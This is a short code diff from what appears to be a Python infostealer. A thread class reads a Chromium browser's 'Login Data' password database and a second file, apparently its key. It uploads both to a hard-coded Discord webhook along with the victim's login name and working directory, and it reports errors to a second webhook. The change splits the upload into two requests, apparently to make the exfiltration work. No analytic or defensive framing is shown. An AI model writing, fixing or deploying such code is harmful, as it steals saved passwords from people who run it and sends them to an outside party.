@@ -77,7 +77,8 @@ class ExtraThread1(QThread):
             dpath = path.join(cdata, "Default", "Login Data")
 
             try: 
-                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files=[{"fieldname": (kpath, open(kpath, "rb").read())}, {"fieldname": (dpath, open(dpath, "rb").read())}], json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
+                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath, open(kpath, "rb").read())}, json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
+                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath, open(dpath, "rb").read())}, json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
             except Exception as e1f: 
                 error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] {str(e1f)}"})
         except Exception as e1: 
